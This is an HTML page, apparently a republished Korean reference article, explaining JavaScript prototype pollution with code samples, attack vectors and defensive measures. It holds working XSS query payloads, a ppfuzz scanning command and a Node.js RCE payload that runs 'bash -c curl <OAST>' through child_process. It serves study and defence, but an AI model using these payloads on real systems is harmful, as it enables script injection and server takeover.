@@ -1,0 +1,213 @@
+<!doctype html>
+<html lang="ko">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Prototype Pollution — PIXN</title>
+  <meta name="description" content="Prototype Pollution — Vulnerabilities, attack surfaces, and defensive verification notes.">
+  <meta property="og:title" content="Prototype Pollution — PIXN"><meta property="og:description" content="Prototype Pollution — Vulnerabilities, attack surfaces, and defensive verification notes."><meta property="og:image" content="https://whgusals84.github.io/pixn-security/og.png"><meta name="twitter:card" content="summary_large_image">
+  <link rel="icon" href="/favicon.svg" type="image/svg+xml">
+  <link rel="stylesheet" href="/assets/style.css">
+</head>
+<body>
+  <header data-site-header data-active="reference"></header>
+  <main class="page article-page" id="main">
+    <header class="article-heading">
+      <p class="eyebrow"><a href="/reference/">Reference</a> / <a href="/reference/attack/">Web Security</a></p>
+      <h1>Prototype Pollution</h1>
+      <time datetime="2022-04-18">APRIL 18, 2022</time>
+    </header>
+    <article class="article-body"><h2 id="introduction">Introduction</h2>
+<p>Prototype Pollution은 Javascript 처리 로직의 문제로 Object 들의 prototype을 수정할 수 있을 때 발생하는 보안 문제를 의미합니다. Object의 protype을 변경할 수 있는 경우 의도된 로직을 벗어나거나 DOM에 관여하여 XSS 등의 추가적인 문제를 발생시킬 수 있습니다.</p>
+<pre><code class="language-javascript hljs"><span class="hljs-keyword">let</span> myObj <span class="hljs-operator">=</span> <span class="hljs-punctuation">{</span><span class="hljs-punctuation">}</span>
+myObj<span class="hljs-punctuation">[</span><span class="hljs-string">&#39;__proto__&#39;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">[</span><span class="hljs-string">&#39;a&#39;</span><span class="hljs-punctuation">]</span> <span class="hljs-operator">=</span> &#39;a���
+<span class="hljs-comment">// myObj의 prototype(__proto__) 의 a에 a를 넣습니다.
+</span><span class="hljs-comment"></span>console<span class="hljs-punctuation">.</span>log<span class="hljs-punctuation">(</span>myObj<span class="hljs-punctuation">.</span>a<span class="hljs-punctuation">)</span>
+
+<span class="hljs-keyword">let</span> newObj <span class="hljs-operator">=</span> <span class="hljs-punctuation">{</span><span class="hljs-punctuation">}</span>
+<span class="hljs-comment">// 이후 newObj라는 Object를 만들었는데,
+</span><span class="hljs-comment"></span><span class="hljs-comment">// log를 보면 a가 찍힙니다. Object prototype이 바뀌었기 때문입니다.
+</span><span class="hljs-comment"></span>console<span class="hljs-punctuation">.</span>log<span class="hljs-punctuation">(</span>newObj<span class="hljs-punctuation">.</span>a<span class="hljs-punctuation">)</span>
+</code></pre>
+<h3 id="prototype-pollution">Prototype Pollution</h3>
+<ul>
+<li><code>Object.__proto__</code></li>
+<li><code>Object.constructor.prototype</code></li>
+</ul>
+<h3 id="property-access">Property Access</h3>
+<p><a href="/reference/attack/dom-clobbering/">DOM Clobbering</a>과 유사하게 Javascript에서 Array, JSON 등은 Object에서 하위 Object를 참고하는 것과 동일하게 사용됩니다.</p>
+<pre><code class="language-javascript hljs"><span class="hljs-keyword">var</span> obj <span class="hljs-operator">=</span> <span class="hljs-punctuation">{</span><span class="hljs-string">&quot;a&quot;</span><span class="hljs-operator">:</span><span class="hljs-number">1</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;b&quot;</span><span class="hljs-operator">:</span><span class="hljs-keyword">function</span><span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">{</span><span class="hljs-keyword">return</span> <span class="hljs-number">99</span><span class="hljs-punctuation">;</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">;</span>
+<span class="hljs-keyword">var</span> name1 <span class="hljs-operator">=</span> <span class="hljs-string">&quot;a&quot;</span><span class="hljs-punctuation">;</span>
+obj<span class="hljs-punctuation">.</span>a <span class="hljs-comment">// 1
+</span><span class="hljs-comment"></span>obj<span class="hljs-punctuation">.</span><span class="hljs-punctuation">[</span><span class="hljs-string">&quot;a&quot;</span><span class="hljs-punctuation">]</span> <span class="hljs-comment">//1
+</span><span class="hljs-comment"></span>obj<span class="hljs-punctuation">[</span>name1<span class="hljs-punctuation">]</span> <span class="hljs-comment">// 1
+</span><span class="hljs-comment"></span>
+<span class="hljs-keyword">var</span> name2 <span class="hljs-operator">=</span> <span class="hljs-string">&quot;b&quot;</span><span class="hljs-punctuation">;</span>
+obj<span class="hljs-punctuation">.</span>b <span class="hljs-comment">// 99
+</span><span class="hljs-comment"></span>obj<span class="hljs-punctuation">.</span><span class="hljs-punctuation">[</span><span class="hljs-string">&quot;b&quot;</span><span class="hljs-punctuation">]</span> <span class="hljs-comment">// function
+</span><span class="hljs-comment"></span>obj<span class="hljs-punctuation">[</span>name2<span class="hljs-punctuation">]</span> <span class="hljs-comment">// function
+</span><span class="hljs-comment"></span></code></pre>
+<h3 id="magic-property">Magic Property</h3>
+<p>프로토타입은 setter/getter Magic Property이기 때문에 프로토타입의 리턴을 설정할 수 있습니다. 그래서 아래와 같이 Number 객체의 prototype을 pollution하여 toString() 함수가 우리가 의도한 함수로 동작하도록 바꿀 수 있습니다. 이러한 공격을 Prototype Pollution이라고 합니다.</p>
+<pre><code class="language-javascript hljs"><span class="hljs-keyword">var</span> test1 <span class="hljs-operator">=</span> <span class="hljs-number">1</span><span class="hljs-punctuation">;</span> <span class="hljs-comment">// int (Number)
+</span><span class="hljs-comment"></span><span class="hljs-keyword">var</span> test2 <span class="hljs-operator">=</span> <span class="hljs-number">2</span><span class="hljs-punctuation">;</span> <span class="hljs-comment">// int (Number)
+</span><span class="hljs-comment"></span>console<span class="hljs-punctuation">.</span>log<span class="hljs-punctuation">(</span>test1<span class="hljs-punctuation">.</span>constructor<span class="hljs-punctuation">)</span><span class="hljs-punctuation">;</span> <span class="hljs-comment">// function Number()
+</span><span class="hljs-comment"></span>console<span class="hljs-punctuation">.</span>log<span class="hljs-punctuation">(</span>test2<span class="hljs-punctuation">.</span>constructor<span class="hljs-punctuation">)</span><span class="hljs-punctuation">;</span> <span class="hljs-comment">// function Number()
+</span><span class="hljs-comment"></span>
+console<span class="hljs-punctuation">.</span>log<span class="hljs-punctuation">(</span>test2<span class="hljs-punctuation">.</span>toString<span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">;</span> <span class="hljs-comment">// &quot;2&quot;
+</span><span class="hljs-comment"></span>test1<span class="hljs-punctuation">.</span>constructor<span class="hljs-punctuation">.</span>prototype<span class="hljs-punctuation">.</span>toString <span class="hljs-operator">=</span> <span class="hljs-keyword">function</span><span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">{</span><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;hacked&quot;</span><span class="hljs-punctuation">}</span>
+console<span class="hljs-punctuation">.</span>log<span class="hljs-punctuation">(</span>test2<span class="hljs-punctuation">.</span>toString<span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">;</span> <span class="hljs-comment">// &quot;hacked&quot;
+</span><span class="hljs-comment"></span></code></pre>
+<h2 id="offensive-techniques">Offensive techniques</h2>
+<h3 id="detect">Detect</h3>
+<h4 id="attack-vector">Attack Vector</h4>
+<p>보편적으로 <code>__proto__</code>를 통한 Prototype 수정 방법이 많이 알려져 있습니다. 다만 이외에도 constructor 등을 통해서도 가능하니 알아두시면 좋습니다.</p>
+<ul>
+<li><code>Object.__proto__</code></li>
+<li><code>Object.constructor.prototype</code></li>
+</ul>
+<h4 id="set-property">Set Property</h4>
+<p>사용자가 통제할 수 있는 입력 구간에서 값을 읽어 Property에 설정하는 로직이 있는 경우 <code>__proto__</code> 와 같은 property를 변경하여 pollution이 가능합니다.</p>
+<pre><code class="language-javascript hljs"><span class="hljs-keyword">function</span> isObject<span class="hljs-punctuation">(</span>obj<span class="hljs-punctuation">)</span> <span class="hljs-punctuation">{</span>
+  <span class="hljs-keyword">return</span> obj <span class="hljs-operator">!==</span> <span class="hljs-literal">null</span> <span class="hljs-operator">&amp;&amp;</span> <span class="hljs-keyword">typeof</span> obj <span class="hljs-operator">===</span> <span class="hljs-string">&#39;object&#39;</span><span class="hljs-punctuation">;</span>
+<span class="hljs-punctuation">}</span>
+
+<span class="hljs-keyword">function</span> setValue<span class="hljs-punctuation">(</span>obj<span class="hljs-punctuation">,</span> key<span class="hljs-punctuation">,</span> value<span class="hljs-punctuation">)</span> <span class="hljs-punctuation">{</span>
+  <span class="hljs-keyword">const</span> keylist <span class="hljs-operator">=</span> key<span class="hljs-punctuation">.</span>split<span class="hljs-punctuation">(</span><span class="hljs-string">&#39;.&#39;</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">;</span>
+  <span class="hljs-keyword">const</span> e <span class="hljs-operator">=</span> keylist<span class="hljs-punctuation">.</span>shift<span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">;</span>
+  <span class="hljs-keyword">if</span> <span class="hljs-punctuation">(</span>keylist<span class="hljs-punctuation">.</span>length <span class="hljs-operator">&gt;</span> <span class="hljs-number">0</span><span class="hljs-punctuation">)</span> <span class="hljs-punctuation">{</span>
+    <span class="hljs-keyword">if</span> <span class="hljs-punctuation">(</span><span class="hljs-operator">!</span>isObject<span class="hljs-punctuation">(</span>obj<span class="hljs-punctuation">[</span>e<span class="hljs-punctuation">]</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">)</span> obj<span class="hljs-punctuation">[</span>e<span class="hljs-punctuation">]</span> <span class="hljs-operator">=</span> <span class="hljs-punctuation">{</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">;</span>
+    setValue<span class="hljs-punctuation">(</span>obj<span class="hljs-punctuation">[</span>e<span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> keylist<span class="hljs-punctuation">.</span>join<span class="hljs-punctuation">(</span><span class="hljs-string">&#39;.&#39;</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">,</span> value<span class="hljs-punctuation">)</span><span class="hljs-punctuation">;</span>
+  <span class="hljs-punctuation">}</span> <span class="hljs-keyword">else</span> <span class="hljs-punctuation">{</span>
+    obj<span class="hljs-punctuation">[</span>key<span class="hljs-punctuation">]</span> <span class="hljs-operator">=</span> value<span class="hljs-punctuation">;</span>
+    <span class="hljs-keyword">return</span> obj<span class="hljs-punctuation">;</span>
+  <span class="hljs-punctuation">}</span>
+<span class="hljs-punctuation">}</span>
+
+<span class="hljs-keyword">const</span> obj1 <span class="hljs-operator">=</span> <span class="hljs-punctuation">{</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">;</span>
+setValue<span class="hljs-punctuation">(</span>obj1<span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;__proto__.hacked&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-number">45</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">;</span>
+<span class="hljs-keyword">const</span> obj2 <span class="hljs-operator">=</span> <span class="hljs-punctuation">{</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">;</span>
+obj2<span class="hljs-punctuation">.</span>hacked<span class="hljs-punctuation">;</span> <span class="hljs-comment">// 1
+</span><span class="hljs-comment"></span></code></pre>
+<h4 id="object-merge">Object Merge</h4>
+<p>Object 2개를 병합하는 merge 형태의 경우도 Prototype Pollution에 취약합니다.</p>
+<pre><code class="language-javascript hljs"><span class="hljs-keyword">function</span> merge<span class="hljs-punctuation">(</span>a<span class="hljs-punctuation">,</span> b<span class="hljs-punctuation">)</span> <span class="hljs-punctuation">{</span>
+  <span class="hljs-keyword">for</span> <span class="hljs-punctuation">(</span><span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> b<span class="hljs-punctuation">)</span> <span class="hljs-punctuation">{</span>
+    <span class="hljs-keyword">if</span> <span class="hljs-punctuation">(</span>isObject<span class="hljs-punctuation">(</span>a<span class="hljs-punctuation">[</span>key<span class="hljs-punctuation">]</span><span class="hljs-punctuation">)</span> <span class="hljs-operator">&amp;&amp;</span> isObject<span class="hljs-punctuation">(</span>b<span class="hljs-punctuation">[</span>key<span class="hljs-punctuation">]</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">)</span> <span class="hljs-punctuation">{</span>
+      merge<span class="hljs-punctuation">(</span>a<span class="hljs-punctuation">[</span>key<span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> b<span class="hljs-punctuation">[</span>key<span class="hljs-punctuation">]</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">;</span>
+    <span class="hljs-punctuation">}</span> <span class="hljs-keyword">else</span> <span class="hljs-punctuation">{</span>
+      a<span class="hljs-punctuation">[</span>key<span class="hljs-punctuation">]</span> <span class="hljs-operator">=</span> b<span class="hljs-punctuation">[</span>key<span class="hljs-punctuation">]</span><span class="hljs-punctuation">;</span>
+    <span class="hljs-punctuation">}</span>
+  <span class="hljs-punctuation">}</span>
+  <span class="hljs-keyword">return</span> a<span class="hljs-punctuation">;</span>
+<span class="hljs-punctuation">}</span>
+
+<span class="hljs-keyword">const</span> obj1 <span class="hljs-operator">=</span> <span class="hljs-punctuation">{</span>a<span class="hljs-operator">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span> b<span class="hljs-operator">:</span><span class="hljs-number">2</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">;</span>
+<span class="hljs-keyword">const</span> obj2 <span class="hljs-operator">=</span> JSON<span class="hljs-punctuation">.</span>parse<span class="hljs-punctuation">(</span><span class="hljs-string">&#39;{&quot;__proto__&quot;:{&quot;hacked&quot;:45}}&#39;</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">;</span>
+merge<span class="hljs-punctuation">(</span>obj1<span class="hljs-punctuation">,</span> obj2<span class="hljs-punctuation">)</span><span class="hljs-punctuation">;</span>
+<span class="hljs-keyword">const</span> obj3 <span class="hljs-operator">=</span> <span class="hljs-punctuation">{</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">;</span>
+obj3<span class="hljs-punctuation">.</span>hacked<span class="hljs-punctuation">;</span> <span class="hljs-comment">// 45
+</span><span class="hljs-comment"></span></code></pre>
+<h4 id="object-copy">Object Copy</h4>
+<p><code>merge({}, obj)</code> 등을 이용한 Copy 로직도 Prototype Pollution에 취약합니다. 특히나 <code>merge({}, obj)</code> 로직은 알려진 Javascript 라이브러리에서 많이 나오는 문제점입니다.</p>
+<pre><code class="language-javascript hljs"><span class="hljs-keyword">function</span> clone<span class="hljs-punctuation">(</span>obj<span class="hljs-punctuation">)</span> <span class="hljs-punctuation">{</span>
+  <span class="hljs-keyword">return</span> merge<span class="hljs-punctuation">(</span><span class="hljs-punctuation">{</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span> obj<span class="hljs-punctuation">)</span><span class="hljs-punctuation">;</span>
+<span class="hljs-punctuation">}</span>
+
+<span class="hljs-keyword">const</span> obj1 <span class="hljs-operator">=</span> JSON<span class="hljs-punctuation">.</span>parse<span class="hljs-punctuation">(</span><span class="hljs-string">&#39;{&quot;__proto__&quot;:{&quot;hacked&quot;:45}}&#39;</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">;</span>
+<span class="hljs-keyword">const</span> obj2 <span class="hljs-operator">=</span> clone<span class="hljs-punctuation">(</span>obj1<span class="hljs-punctuation">)</span><span class="hljs-punctuation">;</span>
+<span class="hljs-keyword">const</span> obj3 <span class="hljs-operator">=</span> <span class="hljs-punctuation">{</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">;</span>
+obj3<span class="hljs-punctuation">.</span>polluted<span class="hljs-punctuation">;</span> <span class="hljs-comment">// 45
+</span><span class="hljs-comment"></span></code></pre>
+<h4 id="object-recursive-merge">Object recursive merge</h4>
+<p>아래와 같이 재귀적으로 merge 하는 경우도 대표적인 취약 모델 중 하나입니다.</p>
+<pre><code class="language-ruby hljs">merge <span class="hljs-punctuation">(</span>target<span class="hljs-punctuation">,</span> source<span class="hljs-punctuation">)</span>
+  foreach property of source
+
+<span class="hljs-keyword">if</span> property exists <span class="hljs-keyword">and</span> is an object on both the target <span class="hljs-keyword">and</span> the source
+  merge<span class="hljs-punctuation">(</span>target<span class="hljs-operator">[</span>property<span class="hljs-operator">]</span><span class="hljs-punctuation">,</span> source<span class="hljs-operator">[</span>property<span class="hljs-operator">]</span><span class="hljs-punctuation">)</span>
+
+<span class="hljs-keyword">else</span>
+  target<span class="hljs-operator">[</span>property<span class="hljs-operator">]</span> <span class="hljs-operator">=</span> source<span class="hljs-operator">[</span>property<span class="hljs-operator">]</span>
+</code></pre>
+<h4 id="parsequerystring">parseQueryString</h4>
+<p><code>parseQueryString</code>, <code>m.parseQueryString</code> 등과 같이 URL Query에서 값을 파싱하여 Object로 사용하는 경우 단순히 웹 페이지에 임의의 Query를 넣는 형태로도 Pollution을 유도할 수 있습니다.</p>
+<pre><code>GET /?__proto__[innerHTML]=&lt;img/src/onerror%3dalert(1)&gt;
+</code></pre>
+<p>이렇게 쿼리 파싱인 경우 ppfuzz 를 도구를 이용하여 쉽게 체크할 수 있습니다.</p>
+<pre><code>ppfuzz -l urls.txt
+</code></pre>
+<p>또한 JSON 포맷을 처리하는 형태도 비슷하게 적용받습니다.</p>
+<pre><code>GET /?__proto__{&quot;innerHTML&quot;: &quot;&lt;img/src/onerror%3dalert(1)&gt;&quot;}
+</code></pre>
+<p><img loading="lazy" src="https://user-images.githubusercontent.com/25837540/125734819-b4e53913-6f6b-4d3c-937a-e936526d6483.gif" alt="https://github.com/dwisiswant0/ppfuzz" /></p>
+<h4 id="library-별-payloads">Library 별 Payloads</h4>
+<ul>
+<li>https://github.com/BlackFan/client-side-prototype-pollution</li>
+<li>https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution</li>
+</ul>
+<h4 id="zap-scripting">ZAP Scripting</h4>
+<p>Prototype Pollution을 쉽게 식별하게 위해서 ZAP에서 <a href="https://github.com/hahwul/fuzzstone/blob/main/zap-scripts/passive/findPrototypePollution.js">Passive 스크립트</a>를 하나 만들어뒀습니다. 해당 패시브 스크립트를 적용하시면 아래와 같이 Response에 알려진 Prototype Pollution 취약 코드가 있는 경우 Alerts에서 Medium 이슈로 표기해줍니다 😎</p>
+<p><img loading="lazy" src="https://user-images.githubusercontent.com/13212227/175046962-fbfd6f44-1cd9-4699-863e-099f42fbd7cc.png" alt="" /></p>
+<h3 id="exploitation">Exploitation</h3>
+<h4 id="xss">XSS</h4>
+<p>Prototype Pollution의 대표적인 리스크는 XSS입니다. Object의 Prototype을 변경할 수 있기 떄문에 이후 Object의 생성이나 사용단에 관여하여 임의로 스크립트가 동작될 수 있도록 변경할 수 있습니다.</p>
+<p>e.g</p>
+<pre><code>GET /?__proto__[innerHTML]=&lt;img/src/onerror%3dalert(1)&gt;
+GET /?__proto__[context]=&lt;img/src/onerror%3dalert(1)&gt;
+GET /?__proto__[onload]=alert(1)
+GET /?__proto__[src][]=data:,alert(1)//
+GET /?__proto__[url]=data:,alert(1)//
+</code></pre>
+<h4 id="localstorage-pollution">localStorage pollution</h4>
+<p>만약 서비스에서 localStorage를 사용할 때 <code>set()</code> 함수가 아닌 getter를 사용하는 경우 Prototype Pollution에 취약합니다. 만약 localStorage에 mydebug 값을 가지고 FE의 설정을 변경한다고 가정하고, FE에서 getter로 이를 가져와서 분기하는 경우 아래와 같이 악용이 가능합니다.</p>
+<pre><code class="language-javascript hljs"><span class="hljs-comment">// localStorage.mydebug is false
+</span><span class="hljs-comment"></span>
+<span class="hljs-comment">// Pollution!
+</span><span class="hljs-comment"></span><span class="hljs-keyword">const</span> obj2 <span class="hljs-operator">=</span> JSON<span class="hljs-punctuation">.</span>parse<span class="hljs-punctuation">(</span><span class="hljs-string">&#39;{&quot;__proto__&quot;:{&quot;mydebug&quot;:true}}&#39;</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">;</span>
+merge<span class="hljs-punctuation">(</span>obj1<span class="hljs-punctuation">,</span> obj2<span class="hljs-punctuation">)</span><span class="hljs-punctuation">;</span>
+
+<span class="hljs-comment">// localStorage.mydebug is true
+</span><span class="hljs-comment"></span>
+<span class="hljs-keyword">if</span> localStorage<span class="hljs-punctuation">.</span>mydebug <span class="hljs-punctuation">{</span>
+  <span class="hljs-comment">// some debug logic..
+</span><span class="hljs-comment"></span><span class="hljs-punctuation">}</span>
+</code></pre>
+<h4 id="bypass-any-protection">Bypass any protection</h4>
+<p>Object의 값을 통제할 수 있기 때문에 Javascript 내부에서 존재하는 통제 로직은 에러를 유도하거나 다른 분기를 유도하여 우회할 수 있습니다.</p>
+<h4 id="rce">RCE</h4>
+<p>Javascript가 동작하는 구간(e.g NodeJS)에 따라서 Server-side의 문제로 번질 수 있습니다.</p>
+<pre><code class="language-javascript hljs"><span class="hljs-punctuation">.</span>es<span class="hljs-punctuation">(</span><span class="hljs-operator">*</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">.</span>props<span class="hljs-punctuation">(</span>label<span class="hljs-punctuation">.</span>__proto__<span class="hljs-punctuation">.</span>env<span class="hljs-punctuation">.</span>AAAA<span class="hljs-operator">=</span><span class="hljs-string">&#39;require(&quot;child_process&quot;).exec(&quot;bash -c curl &lt;OAST&gt;&quot;);process.exit()//&#39;</span><span class="hljs-punctuation">)</span>
+<span class="hljs-punctuation">.</span>props<span class="hljs-punctuation">(</span>label<span class="hljs-punctuation">.</span>__proto__<span class="hljs-punctuation">.</span>env<span class="hljs-punctuation">.</span>NODE_OPTIONS<span class="hljs-operator">=</span><span class="hljs-string">&#39;--require /proc/self/environ&#39;</span><span class="hljs-punctuation">)</span>
+</code></pre>
+<h2 id="defensive-techniques">Defensive techniques</h2>
+<h4 id="objectfreeze">Object.freeze</h4>
+<p>대표적인 방법으론 <code>Object.freeze (Object.prototype)</code>를 사용하여 prototype을 freeze 합니다. 그러면 이후에 prototype을 변경할 수 없어 Pollution을 예방할 수 있습니다.</p>
+<h4 id="not-use-recursive-merge">Not use Recursive merge</h4>
+<p>Recursive merge는 사용하지 않는 것이 좋습니다.</p>
+<h4 id="using-objects-without-prototypes">Using objects without prototypes</h4>
+<p><code>Object.create(null)</code>와 같이 prototype이 없는 object를 이용하여 pollution을 방지할 수 있습니다.</p>
+<h4 id="object-to-map">Object to Map</h4>
+<p>Object 기반의 로직을 Map으로 바꾸어 pollution을 예방할 수 있습니다.</p>
+<h4 id="update-js-library">Update JS Library</h4>
+<p>JS 라이브러리에 Prototype Pollution을 경우도 많습니다. 이러한 경우 가급적 패치 버전, 최신 버전으로 업데이트하는 것이 좋습니다.</p>
+<h2 id="tools">Tools</h2>
+<ul>
+<li>https://github.com/dwisiswant0/ppfuzz</li>
+<li>https://github.com/hahwul/fuzzstone/blob/main/zap-scripts/passive/findPrototypePollution.js</li>
+</ul>
+<h2 id="articles">Articles</h2>
+<ul>
+<li><a href="https://www.hahwul.com/2019/05/01/jqeury-prototype-pollution-cve-2019-11358/">CVE-2019-11358를 통해 Prototype Pollution을 알아보자</a></li>
+<li><a href="https://www.hahwul.com/2022/10/22/localstorage-prototype-pollution/">localStorage + getter = Prototype Pollution</a></li>
+</ul>
+<h2 id="references">References</h2>
+<ul>
+<li>https://github.com/BlackFan/client-side-prototype-pollution</li>
+<li>https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution</li>
+</ul></article>
+    <footer class="article-source"><span>Republished with permission</span><a href="https://www.hahwul.com/cullinan/attack/prototype-pollution/" rel="noopener noreferrer">Original source ↗</a></footer>
+  </main>
+  <footer data-site-footer></footer><script src="/assets/site.js"></script>
+</body>
+</html>
